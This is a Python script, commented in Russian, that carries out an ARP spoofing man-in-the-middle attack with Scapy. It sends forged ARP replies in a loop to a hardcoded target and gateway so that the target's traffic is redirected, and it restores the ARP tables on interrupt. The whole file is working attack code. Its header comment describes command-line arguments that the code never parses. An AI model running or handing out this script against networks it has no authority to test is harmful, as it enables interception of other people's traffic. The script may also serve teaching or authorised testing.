#!/usr/bin/env python
# terminal command example: python arp_spoofing.py -t [target ip] -s [spoof ip]
"""
Этот скрипт использует библиотеку Scapy для выполнения атаки типа "ARP Spoofing" или "Man-in-the-Middle",
позволяя перехватывать трафик между целевым устройством и шлюзом.
Он также предоставляет возможность восстановить исходные ARP-таблицы после завершения атаки.
"""

import scapy.all as scapy
import time


# Функция для получения MAC-адреса устройства по его IP-адресу
def get_mac(ip):
    # Создаем ARP-запрос с указанным IP-адресом
    arp_request = scapy.ARP(pdst=ip)
    # Устанавливаем широковещательный адрес в заголовке Ethernet-пакета
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Объединяем ARP-запрос и широковещательный пакет
    arp_request_broadcast = broadcast / arp_request
    # Отправляем ARP-запрос на все устройства в сети и получаем ответы
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Возвращаем MAC-адрес первого устройства из списка ответов
    return answered_list[0][1].hwsrc


# Функция для подмены MAC-адреса целевого устройства
def spoof(target_ip, spoof_ip):
    # Получаем MAC-адрес целевого устройства
    target_mac = get_mac(target_ip)
    # Создаем ARP-пакет с новым источником (MAC-адрес) и отправляем его
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# Функция для восстановления оригинальных ARP-таблиц
def restore(destination_ip, source_ip):
    # Получаем MAC-адреса устройств
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # Создаем ARP-пакеты с оригинальными MAC-адресами и отправляем их
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# Целевой IP-адрес и IP-адрес шлюза
target_ip = "192.168.0.104"
gateway_ip = "192.168.0.1"

# Основной цикл программы
try:
    packets_sent_count = 0
    while True:
        # Подмена MAC-адресов между целевым устройством и шлюзом
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        # Увеличиваем счетчик отправленных пакетов
        packets_sent_count = packets_sent_count + 2
        # Выводим количество отправленных пакетов
        print("\r[+] Packets sent: " + str(packets_sent_count), end="")
        # Пауза перед следующей итерацией
        time.sleep(2)
except KeyboardInterrupt:
    # Обработка прерывания пользователем (CTRL+C)
    print("\n[-] Detected CTRL + C... Resetting ARP tables..... Please wait.\n")
    # Восстановление оригинальных ARP-таблиц
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
